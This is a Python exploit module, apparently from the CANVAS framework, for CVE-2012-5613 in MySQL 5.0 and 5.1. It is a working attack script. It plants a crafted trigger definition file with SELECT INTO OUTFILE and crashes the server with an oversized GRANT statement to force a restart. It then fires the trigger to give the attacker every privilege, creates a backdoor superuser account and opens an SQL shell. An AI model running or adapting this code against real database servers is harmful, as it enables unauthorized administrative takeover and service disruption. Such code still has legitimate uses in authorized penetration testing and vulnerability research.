import sys
if '.' not in sys.path: sys.path.append('.')

import time
import libs.mysqllib as mysqllib

from exploitutils import *
from tcpexploit import tcpexploit

from SQLNode import SQLNode
from SQLShellServer import mysqlshellserver

DESCRIPTION               = "CVE-2012-5613 - MySQL Privilege Elevation Exploit"
VERSION                   = "1.0"
NAME                      = "CVE-2012-5613"
PROPERTY                  = {}
PROPERTY['TYPE']          = "Exploit"
PROPERTY['SITE']          = "Remote"
PROPERTY['ARCH']          = [ ["Unix", "All"] ]

DOCUMENTATION             = {}
DOCUMENTATION["CVE Name"] = "CVE-2012-5613"
DOCUMENTATION["CVE Url"]  = "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-5613"
DOCUMENTATION             = {}
DOCUMENTATION['Notes']    = """

In order to use this exploit you need:
 * A valid username with FILE privileges.
 * A valid database name.
 * The path of the MySQL server on the target machine.

The exploit will create a new user with ADMIN access to all databases in MySQL.

Tested on MySql 5.1.62 on Ubuntu
Tested on MySql 5.1.63 on Ubuntu
Tested on MySql 5.0.96 on Ubuntu

"""


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name         = NAME
        self.host         = '127.0.0.1'
        self.port         = 3307
        self.database     = 'testing'
        self.path         = '/var/lib/mysql'
        self.username     = 'username'
        self.password     = 'password'
        self.new_user     = 'superuser'
        self.new_pass     = 'superpassword'
        self.timeout      = 20
        self.trg = {}
        self.trg['5.0']   = """select 'TYPE=TRIGGERS' into outfile'%s/%s/user_data.TRG' LINES TERMINATED BY '\\ntriggers=\\'CREATE DEFINER=`root`@`localhost` trigger atk after insert on user_data for each row\\\\nbegin \\\\nUPDATE mysql.user SET Select_priv=\\\\\\\'Y\\\\\\\', Insert_priv=\\\\\\'Y\\\\\\', Update_priv=\\\\\\'Y\\\\\\', Delete_priv=\\\\\\'Y\\\\\\', Create_priv=\\\\\\'Y\\\\\\', Drop_priv=\\\\\\'Y\\\\\\', Reload_priv=\\\\\\'Y\\\\\\', Shutdown_priv=\\\\\\'Y\\\\\\', Process_priv=\\\\\\'Y\\\\\\', File_priv=\\\\\\'Y\\\\\\', Grant_priv=\\\\\\'Y\\\\\\', References_priv=\\\\\\'Y\\\\\\', Index_priv=\\\\\\'Y\\\\\\', Alter_priv=\\\\\\'Y\\\\\\', Show_db_priv=\\\\\\'Y\\\\\\', Super_priv=\\\\\\'Y\\\\\\', Create_tmp_table_priv=\\\\\\'Y\\\\\\', Lock_tables_priv=\\\\\\'Y\\\\\\', Execute_priv=\\\\\\'Y\\\\\\', Repl_slave_priv=\\\\\\'Y\\\\\\', Repl_client_priv=\\\\\\'Y\\\\\\', Create_view_priv=\\\\\\'Y\\\\\\', Show_view_priv=\\\\\\'Y\\\\\\', Create_routine_priv=\\\\\\'Y\\\\\\', Alter_routine_priv=\\\\\\'Y\\\\\\', Create_user_priv=\\\\\\'Y\\\\\\', ssl_type=\\\\\\'Y\\\\\\', ssl_cipher=\\\\\\'Y\\\\\\', x509_issuer=\\\\\\'Y\\\\\\', x509_subject=\\\\\\'Y\\\\\\', max_questions=\\\\\\'Y\\\\\\', max_updates=\\\\\\'Y\\\\\\', max_connections=\\\\\\'Y\\\\\\' WHERE User=\\\\\\'%s\\\\\\';\\\\nend\\'\nsql_modes=0\ndefiners=\\'root@localhost\\'\nclient_cs_names=\\'latin1\\'\nconnection_cl_names=\\'latin1_swedish_ci\\'\ndb_cl_names=\\'latin1_swedish_ci\\'\n';"""
        self.trg['5.1']   = """select 'TYPE=TRIGGERS' into outfile'%s/%s/user_data.TRG' LINES TERMINATED BY '\\ntriggers=\\'CREATE DEFINER=`root`@`localhost` trigger atk after insert on user_data for each row\\\\nbegin \\\\nUPDATE mysql.user SET Select_priv=\\\\\\\'Y\\\\\\\', Insert_priv=\\\\\\'Y\\\\\\', Update_priv=\\\\\\'Y\\\\\\', Delete_priv=\\\\\\'Y\\\\\\', Create_priv=\\\\\\'Y\\\\\\', Drop_priv=\\\\\\'Y\\\\\\', Reload_priv=\\\\\\'Y\\\\\\', Shutdown_priv=\\\\\\'Y\\\\\\', Process_priv=\\\\\\'Y\\\\\\', File_priv=\\\\\\'Y\\\\\\', Grant_priv=\\\\\\'Y\\\\\\', References_priv=\\\\\\'Y\\\\\\', Index_priv=\\\\\\'Y\\\\\\', Alter_priv=\\\\\\'Y\\\\\\', Show_db_priv=\\\\\\'Y\\\\\\', Super_priv=\\\\\\'Y\\\\\\', Create_tmp_table_priv=\\\\\\'Y\\\\\\', Lock_tables_priv=\\\\\\'Y\\\\\\', Execute_priv=\\\\\\'Y\\\\\\', Repl_slave_priv=\\\\\\'Y\\\\\\', Repl_client_priv=\\\\\\'Y\\\\\\', Create_view_priv=\\\\\\'Y\\\\\\', Show_view_priv=\\\\\\'Y\\\\\\', Create_routine_priv=\\\\\\'Y\\\\\\', Alter_routine_priv=\\\\\\'Y\\\\\\', Create_user_priv=\\\\\\'Y\\\\\\', Event_priv=\\\\\\'Y\\\\\\', Trigger_priv=\\\\\\'Y\\\\\\', ssl_type=\\\\\\'Y\\\\\\', ssl_cipher=\\\\\\'Y\\\\\\', x509_issuer=\\\\\\'Y\\\\\\', x509_subject=\\\\\\'Y\\\\\\', max_questions=\\\\\\'Y\\\\\\', max_updates=\\\\\\'Y\\\\\\', max_connections=\\\\\\'Y\\\\\\' WHERE User=\\\\\\'%s\\\\\\';\\\\nend\\'\nsql_modes=0\ndefiners=\\'root@localhost\\'\nclient_cs_names=\\'latin1\\'\nconnection_cl_names=\\'latin1_swedish_ci\\'\ndb_cl_names=\\'latin1_swedish_ci\\'\n';"""
        self.trn          = """ SELECT 'TYPE=TRIGGERNAME\\ntrigger_table=user_data;' into outfile '%s/%s/atk.TRN' FIELDS ESCAPED BY '';"""

    def getargs(self):
        map(self.getarg, ('port', 'path', 'database', 'username',
                          'password', 'new_user', 'new_pass', 'timeout'))

    def neededListenerTypes(self):
        return []

    def test(self):
        self.getargs()
        self.host = self.target.interface

        try:
            m = mysqllib.MySQL(timeout=self.timeout)
            m.connect((self.host, self.port))
            version = m.getServerVersion()
            if version[0:4] == '5.1.' or version[0:4] == '5.0.':
                return 1
        except Exception, ex:
            self.log('Error: %s' % ex)
        finally:
            m.close()

        return 0

    def run(self):
        self.getargs()
        self.host = self.target.interface
        self.socknode = self.argsDict["passednodes"][0]

        self.setInfo("%s running against %s:%d (in progress)" % (NAME, self.host, self.port))

        # Stage One
        try:
            m = mysqllib.MySQL(timeout=self.timeout)
            m.connect((self.host, self.port))
            version = m.getServerVersion()
        except Exception, ex:
            self.log('Error: %s' % ex)
            return 0

        if version[0:4] == '5.1.':
            trigger_trg = self.trg['5.1'] % (self.path, self.database, self.username)
        else:
            trigger_trg = self.trg['5.0'] % (self.path, self.database, self.username)

        try:
            m.authenticate(self.username,self.password,self.database)
        except Exception, ex:
            self.log("Auth error with username:%s and password:%s (%s)" % (self.username, self.password, ex))
            return 0

        # Create the database and the trigger.
        try:
            self.log('Creating Table')
            m.query("CREATE TABLE user_data (user_data VARCHAR(256));")
        except Exception, ex:
            self.log('Error: %s' % ex)
            return 0

        self.log('Creating Trigger')

        try:
            m.query(trigger_trg)
            trigger_trn = self.trn % (self.path,self.database)
            m.query(trigger_trn)
        except Exception, ex:
            self.log('Error: %s' % ex)
            return 0

        # Restart the sql server by crashing it to load the trigger.
        self.log("MySQL Server is restarting now, please wait")

        try:
            m.query("grant all on " + 'A'*10000 + ".* to 'user'@'\%' identified by 'secret';")
        except Exception:
            pass

        time.sleep(4)

        self.log("Stage One completed")

        # Stage Two
        self.log('Executing Trigger')

        try:
            m = mysqllib.MySQL(timeout=self.timeout)
            m.connect((self.host, self.port))
        except Exception, ex:
            self.log('Error: %s' % ex)
            return 0

        try:
            m.authenticate(self.username,self.password,self.database)
        except Exception, ex:
            self.log("Auth error with username:%s and password:%s (%s)" % (self.username, self.password, ex))
            return 0

        # Fires the trigger
        try:
            m.query("INSERT INTO user_data VALUES('asd123');")
        except Exception, ex:
            self.log('Error: %s' % ex)
            return 0

        self.log("MySQL Server is restarting now, please wait")

        try:
            m.query("grant all on " + 'A'*10000 + ".* to 'user'@'\%' identified by 'secret';")
        except Exception:
            pass

        time.sleep(4)
        self.log('Stage Two Completed')

        # Stage Three
        try:
            m = mysqllib.MySQL(timeout=self.timeout)
            m.connect((self.host, self.port))
        except Exception, ex:
            self.log('Error: %s' % ex)
            return 0

        try:
            m.authenticate(self.username,self.password,self.database)
        except Exception, ex:
            self.log("Auth error with username:%s and password:%s (%s)" % (self.username, self.password, ex))
            return 0

        self.log('Creating the new user')
        try:
            m.query("CREATE USER '" + self.new_user + "'@'%' IDENTIFIED BY '" + self.new_pass + "';")
        except Exception:
            self.log('User already exists.')
            return 0

        self.log('Granting privileges to the new user')

        try:
            m.query("GRANT ALL PRIVILEGES ON *.* TO '" + self.new_user + "'@'%' WITH GRANT OPTION;")
        except Exception, ex:
            self.log('Error: %s' % ex)
            return 0

        self.log("MySQL Server is restarting now, please wait")

        try:
            m.query("grant all on " + 'A'*10000 + ".* to 'user'@'\%' identified by 'secret';")
        except Exception:
            pass

        time.sleep(4)

        self.log('Stage Three Completed')
        self.log('All Done')
        m.close()

        try:
            # Protocol has to be different than 41 so the node can work.
            m = mysqllib.MySQL(protocol=21,timeout=self.timeout)
            m.connect((self.host, self.port))
        except Exception, ex:
            self.log('Error: %s' % ex)
            return 0

        try:
            m.authenticate(self.username,self.password,self.database)
        except Exception, ex:
            self.log("Auth error with username:%s and password:%s (%s)" % (self.username, self.password, ex))
            return 0

        self.setInfo("%s attacking %s:%d (success)" % (NAME,self.host, self.port), showlog=1)
        node = SQLNode()
        node.parentnode = self.socknode
        shell = mysqlshellserver(m, node, logfunction=self.logfunction)
        shell.startup()
        node.startup()
        return node

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
